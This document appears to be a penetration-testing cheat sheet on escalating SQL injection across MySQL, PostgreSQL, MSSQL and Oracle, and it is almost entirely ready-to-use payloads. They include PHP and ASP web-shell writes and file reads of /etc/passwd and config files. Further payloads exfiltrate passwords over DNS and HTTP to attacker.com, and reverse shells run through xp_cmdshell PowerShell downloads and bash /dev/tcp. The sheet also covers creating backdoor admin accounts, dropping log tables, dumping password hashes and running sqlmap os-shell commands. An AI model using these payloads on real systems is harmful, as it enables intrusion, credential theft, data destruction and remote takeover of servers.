---
tags:
  - critical
  - server-side
---

# SQLi Escalation

## Data Exfiltration

### File Reading

```sql
-- MySQL (requires FILE privilege)
SELECT LOAD_FILE('/etc/passwd');
' UNION SELECT LOAD_FILE('/var/www/html/config.php'),NULL,NULL-- -

-- PostgreSQL
CREATE TABLE tmp(content text);
COPY tmp FROM '/etc/passwd';
SELECT * FROM tmp;

-- MSSQL
CREATE TABLE tmp(content varchar(8000));
BULK INSERT tmp FROM 'c:\windows\win.ini';
SELECT * FROM tmp;
```

### File Writing

```sql
-- MySQL
SELECT '<?php system($_GET["c"]); ?>' INTO OUTFILE '/var/www/html/shell.php';
' UNION SELECT '<?php system($_GET["c"]);?>',NULL INTO OUTFILE '/var/www/shell.php'-- -

-- PostgreSQL
COPY (SELECT '<?php system($_GET["c"]); ?>') TO '/var/www/html/shell.php';

-- MSSQL
EXEC sp_makewebtask 'c:\inetpub\wwwroot\shell.asp','SELECT ''<%execute(request("c"))%>''';
```

---

## Out-of-Band Exfiltration

When no direct output available.

### DNS Exfiltration

```sql
-- MySQL (requires FILE privilege)
SELECT LOAD_FILE(CONCAT('\\\\',version(),'.attacker.com\\a.txt'));
SELECT LOAD_FILE(CONCAT('\\\\',SUBSTRING(password,1,10),'.attacker.com\\x')) FROM users;

-- MSSQL
EXEC master..xp_dirtree '\\attacker.com\share';
EXEC master..xp_dirtree '\\'+@@version+'.attacker.com\x';

-- Oracle
SELECT EXTRACTVALUE(xmltype('<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % r SYSTEM "http://'||(SELECT password FROM users WHERE rownum=1)||'.attacker.com/">%r;]>'),'/l') FROM dual;
```

### HTTP Exfiltration

```sql
-- Oracle
SELECT UTL_HTTP.REQUEST('http://attacker.com/'||(SELECT password FROM users WHERE rownum=1)) FROM dual;

-- PostgreSQL (with dblink)
SELECT dblink_connect('host=attacker.com user='||(SELECT password FROM users)||' password=x');
```

---

## Command Execution

### MSSQL - xp_cmdshell

```sql
-- Enable if disabled
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;

-- Execute commands
EXEC xp_cmdshell 'whoami';
EXEC xp_cmdshell 'net user hacker P@ss /add';
EXEC xp_cmdshell 'net localgroup administrators hacker /add';

-- Reverse shell
EXEC xp_cmdshell 'powershell -c "IEX(New-Object Net.WebClient).downloadString(''http://attacker.com/shell.ps1'')"';
```

### PostgreSQL - COPY FROM PROGRAM

```sql
-- PostgreSQL 9.3+
CREATE TABLE cmd_output(output text);
COPY cmd_output FROM PROGRAM 'id';
SELECT * FROM cmd_output;

-- Reverse shell
COPY cmd_output FROM PROGRAM 'bash -c "bash -i >& /dev/tcp/attacker.com/4444 0>&1"';
```

### MySQL - UDF (User Defined Functions)

```sql
-- Requires ability to write files
-- Load malicious .so/.dll into plugin directory

-- Linux
SELECT unhex('...UDF binary...') INTO DUMPFILE '/usr/lib/mysql/plugin/udf.so';
CREATE FUNCTION sys_exec RETURNS INT SONAME 'udf.so';
SELECT sys_exec('id');

-- Windows
SELECT unhex('...') INTO DUMPFILE 'C:\\mysql\\lib\\plugin\\udf.dll';
```

---

## Privilege Escalation

### MySQL User Enumeration

```sql
SELECT user,host,authentication_string FROM mysql.user;
SELECT * FROM mysql.user WHERE super_priv='Y';
```

### MSSQL Impersonation

```sql
-- Check if impersonation allowed
SELECT * FROM sys.server_permissions WHERE type = 'IM';

-- Execute as another user
EXECUTE AS LOGIN = 'sa';
EXEC xp_cmdshell 'whoami';
REVERT;
```

### PostgreSQL Superuser

```sql
-- Check current privileges
SELECT usename, usesuper FROM pg_user;

-- If superuser
COPY (SELECT '<?php system($_GET["c"]);?>') TO '/var/www/shell.php';
```

---

## Stacked Queries

Works on PostgreSQL, MSSQL (not MySQL by default).

```sql
-- Insert backdoor account
'; INSERT INTO users VALUES('hacker','admin','hacked@evil.com')--

-- Drop table
'; DROP TABLE logs--

-- Update privileges
'; UPDATE users SET role='admin' WHERE username='hacker'--

-- MSSQL: Enable xp_cmdshell
'; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;--
```

---

## Reading Source Code

```sql
-- MySQL
' UNION SELECT LOAD_FILE('/var/www/html/index.php'),NULL,NULL-- -
' UNION SELECT LOAD_FILE('/var/www/html/config.php'),NULL,NULL-- -

-- Common paths to try
/var/www/html/
/var/www/
/srv/www/
/home/user/public_html/
C:\inetpub\wwwroot\
C:\xampp\htdocs\
```

---

## Extracting Hashes

### MySQL

```sql
SELECT user, password FROM mysql.user;
SELECT user, authentication_string FROM mysql.user;  -- MySQL 5.7+
```

### PostgreSQL

```sql
SELECT usename, passwd FROM pg_shadow;
```

### MSSQL

```sql
SELECT name, password_hash FROM sys.sql_logins;
```

---

## sqlmap Escalation Options

```bash
# Read file
sqlmap -u "URL" --file-read="/etc/passwd"

# Write file
sqlmap -u "URL" --file-write="shell.php" --file-dest="/var/www/shell.php"

# OS shell
sqlmap -u "URL" --os-shell

# SQL shell
sqlmap -u "URL" --sql-shell

# Database password hash dump
sqlmap -u "URL" --passwords
```

---

## Chaining with Other Vulns

### SQLi → XSS

```sql
' UNION SELECT '<script>alert(1)</script>',NULL,NULL-- -
```

### SQLi → LFI

Read files via SQL, understand application paths.

### SQLi → SSRF

```sql
-- MySQL
SELECT LOAD_FILE('\\\\internal-server\\share');

-- MSSQL
EXEC master..xp_dirtree '\\\\internal-server\\share';
```

### SQLi → RCE (via file write)

```sql
' UNION SELECT '<?php system($_GET["c"]);?>',NULL INTO OUTFILE '/var/www/shell.php'-- -
```

Then access: `http://target.com/shell.php?c=whoami`
